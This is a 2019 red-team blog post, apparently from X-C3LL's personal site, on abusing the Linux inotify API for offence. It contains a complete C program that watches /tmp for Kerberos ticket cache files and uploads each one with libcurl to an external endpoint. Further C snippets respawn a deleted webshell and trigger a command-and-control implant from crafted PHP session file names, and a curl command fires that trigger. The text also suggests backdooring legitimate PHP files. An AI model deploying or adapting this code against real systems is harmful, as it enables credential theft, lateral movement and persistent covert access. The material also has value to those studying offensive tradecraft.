@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Rethinking the inotify API as an offensive helper | Doomsday Vault</title>
+<meta name="generator" content="Jekyll v3.9.5" />
+<meta property="og:title" content="Rethinking the inotify API as an offensive helper" />
+<meta name="author" content="X-C3LL" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Examples of how the inotify API can be useful for the Red Team" />
+<meta property="og:description" content="Examples of how the inotify API can be useful for the Red Team" />
+<link rel="canonical" href="http://localhost:4000/posts/2019/04/01/rethinking-inotify.html" />
+<meta property="og:url" content="http://localhost:4000/posts/2019/04/01/rethinking-inotify.html" />
+<meta property="og:site_name" content="Doomsday Vault" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2019-04-01T13:00:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Rethinking the inotify API as an offensive helper" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"X-C3LL"},"dateModified":"2019-04-01T13:00:00+02:00","datePublished":"2019-04-01T13:00:00+02:00","description":"Examples of how the inotify API can be useful for the Red Team","headline":"Rethinking the inotify API as an offensive helper","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/2019/04/01/rethinking-inotify.html"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/img/logo.jpg"},"name":"X-C3LL"},"url":"http://localhost:4000/posts/2019/04/01/rethinking-inotify.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=c27a30cb27997bd3ed45ba5a77bd97bd27cbeb64">
+    <!--[if lt IE 9]>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <![endif]-->
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+  <body>
+    <div class="wrapper">
+      <header>
+
+        <h1><a href="http://localhost:4000/">Doomsday Vault</a></h1>
+
+        
+          <img src="/assets/img/logo.jpg" alt="Logo" />
+        
+
+        <p>X-C3LL's Personal Blog :)</p>
+
+
+        
+        <ul class="downloads">
+          <li><a href="https://twitter.com/TheXC3LL">@TheXC3LL<strong>Twitter</strong></a></li>
+          <li><a href="https://www.linkedin.com/in/thexc3ll/">thexc3ll<strong>LinkedIn</strong></a></li>
+          <li><a href="https://mastodon.social/@XC3LL">@XC3LL<strong>Mastodon</strong></a></li>
+        </ul>
+        
+               <nav>
+  <ul>
+    <li><a href="/">Home</a></li>
+  <li><a href="/about.html">About</a></li>
+    <li><a href="/cves.html">CVEs</a></li>
+    <li><a href="/tools.html">Tools</a></li>
+    <li><a href="/stuff.html">Slides & Articles</a></li>
+  <li><a href="/rss.xml">RSS</a>/<a href="/atom.xml">Atom</a></li>
+  
+</ul>
+</nav>
+      </header>
+      <section>
+
+      <small>1 April 2019</small>
+<h1>Rethinking the inotify API as an offensive helper</h1>
+
+
+<p>        
+Historically speaking the <a href="http://man7.org/linux/man-pages/man7/inotify.7.html">inotify API</a> has been, for far, more related with defensive tasks than with the offensive side. This is absolutely natural: through this API the IT administrators can monitor any change in files or directories, so it is a really helpful aid to detect the artifacts generated while an intrusion. But inotify can be used in an offensive way too, being a tool more to keep in mind <strong>:)</strong>.</p>
+
+<p>        
+Our humble intention with this brief (really brief) article is to expose some ideas around inotify and how it can be used in the context of a Red Team operation. Let’s start!</p>
+
+<h2 id="0x00-stealing-ccache-files">0x00 Stealing ccache files</h2>
+
+<p>        
+In corporate networks, where linux and windows systems coexists in a mixed enviroment, can be natural to delegate the authentication to the Active Directory. In this kind of enviroments, when your first compromised server is a Linux machine, usually is fruitful to check for credential cache files. The credential cache (<strong>ccache</strong>) file holds the <strong>TGT</strong> (<a href="https://en.wikipedia.org/wiki/Kerberos_(protocol)">Ticket-Granting-Ticket</a>) used to authenticate a user to a service via Kerberos, so as attackers we are highly interested in those juicy tickets.</p>
+
+<p>        
+The ccache files by default are in /tmp with a format name like “<strong>krb5cc_%UID%</strong>” and can be used directly by the majority of tools based in the <a href="https://github.com/SecureAuthCorp/impacket">Impacket Framework</a>, so if we can read the file contents (<em>we pwned the server and got root before</em>) we can move laterally (or even escalate privileges if we are lucky enough to get a TGT from a privileged user) and execute commands via psexec.py/smbexec.py/whatever-impacket-tool.py in other machines. But… if no valid tickets are found (they have a lifetime relatively short) and we know that kerberos is used as authentication method… what can we do? Well… we can wait and set an inotify watcher to detect every new ticket generated and forward them to us <strong>:)</strong>.</p>
+
+<p>        
+Our plan is pretty simple: we are going to create a little watcher for the /tmp directory. If a file with the prefix “krb5cc_” is created or modified we are going to send it to an external endpoint controled by us. This can be accomplished via domain fronting or via DNS as we saw before in the article “<a href="https://x-c3ll.github.io/posts/PAM-backdoor-DNS/">Exfiltrating credentials via PAM backdoors &amp; DNS requests</a>”. The code is self-explained:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Example based on https://www.lynxbee.com/c-program-to-monitor-and-notify-changes-in-a-directory-file-using-inotify/</span>
+<span class="cp">#define _GNU_SOURCE
+</span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/inotify.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;limits.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;curl/curl.h&gt;</span><span class="cp">
+</span>
+<span class="cp">#define MAX_EVENTS 1024 </span><span class="cm">/*Max. number of events to process at one go*/</span><span class="cp">
+#define LEN_NAME 1024 </span><span class="cm">/*Assuming length of the filename won't exceed 16 bytes*/</span><span class="cp">
+#define EVENT_SIZE  ( sizeof (struct inotify_event)  ) </span><span class="cm">/*size of one event*/</span><span class="cp">
+#define BUF_LEN     ( MAX_EVENTS * ( EVENT_SIZE + LEN_NAME  ) ) </span><span class="cm">/*buffer to store the data of events*/</span><span class="cp">
+</span>
+<span class="cp">#define endpoint "http://localhost:4444"
+</span>
+<span class="kt">int</span> <span class="nf">exfiltrate</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">filename</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">CURL</span> <span class="o">*</span><span class="n">curl</span><span class="p">;</span>
+    <span class="n">CURLcode</span> <span class="n">res</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">stat</span> <span class="n">file_info</span><span class="p">;</span>
+    <span class="kt">FILE</span> <span class="o">*</span><span class="n">fd</span><span class="p">;</span>
+
+    <span class="n">fd</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">fd</span><span class="p">){</span>
+        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">fstat</span><span class="p">(</span><span class="n">fileno</span><span class="p">(</span><span class="n">fd</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">file_info</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">curl</span> <span class="o">=</span> <span class="n">curl_easy_init</span><span class="p">();</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">curl</span><span class="p">){</span>
+        <span class="n">curl_easy_setopt</span><span class="p">(</span><span class="n">curl</span><span class="p">,</span> <span class="n">CURLOPT_URL</span><span class="p">,</span> <span class="n">endpoint</span><span class="p">);</span>
+        <span class="n">curl_easy_setopt</span><span class="p">(</span><span class="n">curl</span><span class="p">,</span> <span class="n">CURLOPT_UPLOAD</span><span class="p">,</span> <span class="mi">1L</span><span class="p">);</span>
+        <span class="n">curl_easy_setopt</span><span class="p">(</span><span class="n">curl</span><span class="p">,</span> <span class="n">CURLOPT_READDATA</span><span class="p">,</span> <span class="n">fd</span><span class="p">);</span>
+        <span class="n">res</span> <span class="o">=</span> <span class="n">curl_easy_perform</span><span class="p">(</span><span class="n">curl</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">res</span> <span class="o">!=</span> <span class="n">CURLE_OK</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="n">curl_easy_cleanup</span><span class="p">(</span><span class="n">curl</span><span class="p">);</span>
+    <span class="p">}</span>       
+    <span class="n">fclose</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
+    <span class="kt">int</span> <span class="n">length</span><span class="p">,</span> <span class="n">i</span><span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">wd</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span> 
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="n">BUF_LEN</span><span class="p">];</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">ticketloc</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[Kerberos ccache exfiltrator PoC]</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
+   
+    <span class="c1">//Initiate inotify</span>
+    <span class="k">if</span> <span class="p">((</span><span class="n">fd</span> <span class="o">=</span> <span class="n">inotify_init</span><span class="p">())</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Could not initiate inotify!!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">//Add a watcher for the creation or modification of files at /tmp folder</span>
+    <span class="k">if</span> <span class="p">((</span><span class="n">wd</span> <span class="o">=</span> <span class="n">inotify_add_watch</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="s">"/tmp"</span><span class="p">,</span> <span class="n">IN_CREATE</span> <span class="o">|</span> <span class="n">IN_MODIFY</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Could not add a watcher!!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="o">-</span><span class="mi">2</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">//Main loop </span>
+    <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">length</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">BUF_LEN</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">length</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="o">-</span><span class="mi">3</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="k">while</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;</span> <span class="n">length</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">struct</span> <span class="n">inotify_event</span> <span class="o">*</span><span class="n">event</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">inotify_event</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">event</span><span class="o">-&gt;</span><span class="n">len</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="c1">//Check for prefix</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">event</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="s">"krb5cc_"</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="s">"krb5cc_"</span><span class="p">))</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
+                        <span class="n">printf</span><span class="p">(</span><span class="s">"New cache file found! (%s)"</span><span class="p">,</span> <span class="n">event</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
+                        <span class="n">asprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ticketloc</span><span class="p">,</span> <span class="s">"/tmp/%s"</span><span class="p">,</span><span class="n">event</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
+                        <span class="c1">//Forward it to us</span>
+                        <span class="k">if</span> <span class="p">(</span><span class="n">exfiltrate</span><span class="p">(</span><span class="n">ticketloc</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+                            <span class="n">printf</span><span class="p">(</span><span class="s">" - Failed!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+                        <span class="p">}</span>
+                        <span class="k">else</span> <span class="p">{</span>
+                            <span class="n">printf</span><span class="p">(</span><span class="s">" - Exfiltrated!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+                        <span class="p">}</span>
+                        <span class="n">free</span><span class="p">(</span><span class="n">ticketloc</span><span class="p">);</span>
+                    <span class="p">}</span>
+                <span class="n">i</span> <span class="o">+=</span> <span class="n">EVENT_SIZE</span> <span class="o">+</span> <span class="n">event</span><span class="o">-&gt;</span><span class="n">len</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>        
+Of course this is just an option to get notified (and to steal inmediately) when a new ccache file is created. A really great idea is to combine this with a search via LDAP to check if the file corresponds to a privileged user and then act accordingly <strong>:)</strong>.</p>
+
+<h2 id="0x01-re-infecting-cms-installations">0x01 Re-infecting CMS installations</h2>
+<p>        
+A common problem related with webshells and similar persistence methods is that they can vanish in just a moment when the web application is updated (for example, to fix the vulnerability that we just exploited). We can use inotify to monitor when our webshell is deleted and then create a new one (and alert us about this action). We only need to change the mask used to filter the events:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
+    <span class="kt">int</span> <span class="n">length</span><span class="p">,</span> <span class="n">i</span><span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">wd</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span> 
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="n">BUF_LEN</span><span class="p">];</span>
+
+    <span class="c1">//Initiate inotify</span>
+    <span class="k">if</span> <span class="p">((</span><span class="n">fd</span> <span class="o">=</span> <span class="n">inotify_init</span><span class="p">())</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Could not initiate inotify!!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">//Webshell location</span>
+    <span class="k">if</span> <span class="p">((</span><span class="n">wd</span> <span class="o">=</span> <span class="n">inotify_add_watch</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="s">"/var/www/html/my_shinny_webshell.php"</span><span class="p">,</span> <span class="n">IN_DELETE</span> <span class="o">|</span> <span class="n">IN_DELETE_SELF</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Could not add a watcher!!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="o">-</span><span class="mi">2</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">//Main loop </span>
+    <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">length</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">BUF_LEN</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">length</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="o">-</span><span class="mi">3</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="k">while</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;</span> <span class="n">length</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">struct</span> <span class="n">inotify_event</span> <span class="o">*</span><span class="n">event</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">inotify_event</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">event</span><span class="o">-&gt;</span><span class="n">len</span><span class="p">)</span> <span class="p">{</span>
+                
+      			<span class="n">respawn_webshell</span><span class="p">();</span>
+                
+                <span class="n">i</span> <span class="o">+=</span> <span class="n">EVENT_SIZE</span> <span class="o">+</span> <span class="n">event</span><span class="o">-&gt;</span><span class="n">len</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+<span class="p">}</span>
+</code></pre></div></div>
+<p>        
+Another related idea is to check when a legit PHP file was modified and then add our backdoor to that file. Or, for example, we can monitor config files to check if the credentials are changed at some point after our intrusion.</p>
+
+<h2 id="0x02-trigger-malware-actions-based-on-session-names-php">0x02 Trigger malware actions based on session names (PHP)</h2>
+<p>        
+We can use the name of the files created to store PHP sessions as a covert channel in order to communicate commands to our implants. For example, imagine a perimetral web server with an application made in PHP that was pwned by us, where our unique way to interact with our implants is via the web. If we are not interested in generate too much outbound traffic via polling an idea to keep in mind (and yes, there are tons of alternatives, this is just one more to add to your playbook) is to use inotify to monitor the directory where PHP sessions are created and create a trigger based on that. When a condition is met (for example, the creation of a file with the name sess_ALEAIACTAESTXX) we start the comunication with the C&amp;C.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
+    <span class="kt">int</span> <span class="n">length</span><span class="p">,</span> <span class="n">i</span><span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">wd</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span> 
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="n">BUF_LEN</span><span class="p">];</span>
+
+
+    <span class="c1">//Initiate inotify</span>
+    <span class="k">if</span> <span class="p">((</span><span class="n">fd</span> <span class="o">=</span> <span class="n">inotify_init</span><span class="p">())</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Could not initiate inotify!!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">//Session folder as set in session.save_path</span>
+    <span class="k">if</span> <span class="p">((</span><span class="n">wd</span> <span class="o">=</span> <span class="n">inotify_add_watch</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="s">"/var/lib/php/session"</span><span class="p">,</span> <span class="n">IN_CREATE</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Could not add a watcher!!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="o">-</span><span class="mi">2</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">//Main loop </span>
+    <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">length</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">BUF_LEN</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">length</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="o">-</span><span class="mi">3</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="k">while</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;</span> <span class="n">length</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">struct</span> <span class="n">inotify_event</span> <span class="o">*</span><span class="n">event</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">inotify_event</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">event</span><span class="o">-&gt;</span><span class="n">len</span><span class="p">)</span> <span class="p">{</span>
+                
+                    <span class="k">if</span> <span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">event</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="s">"sess_ALEAIACTAEST"</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="s">"sess_ALEAIACTAEST"</span><span class="p">))</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
+                        <span class="n">start_communication_with_CC</span><span class="p">();</span>
+                    <span class="p">}</span>
+                
+                <span class="n">i</span> <span class="o">+=</span> <span class="n">EVENT_SIZE</span> <span class="o">+</span> <span class="n">event</span><span class="o">-&gt;</span><span class="n">len</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>        
+With a simple Curl request (<code class="language-plaintext highlighter-rouge">curl http://localhost/test.php --cookie "PHPSESSID=ALEAIACTAESTx1"</code>) we can trigger the action.</p>
+
+<h2 id="0x03-final-words">0x03 Final words</h2>
+<p>        
+As I said in the introduction this is a brief article to give you some ideas related with inotify. Probably I gonna edit this post in the future to increase it with more ideas, but If you already have one, feel free to ping me at twitter ([@TheXC3LL])(https://twitter.com/TheXC3LL).</p>
+
+
+
+
+      </section>
+      <footer>
+        
+        <p>This project is maintained by <a href="https://github.com/pages-themes">pages-themes</a></p>
+        
+        <p><small>Hosted on GitHub Pages &mdash; Theme by <a href="https://github.com/orderedlist">orderedlist</a></small></p>
+      </footer>
+    </div>
+    <script src="/assets/js/scale.fix.js"></script>
+  </body>
+</html>
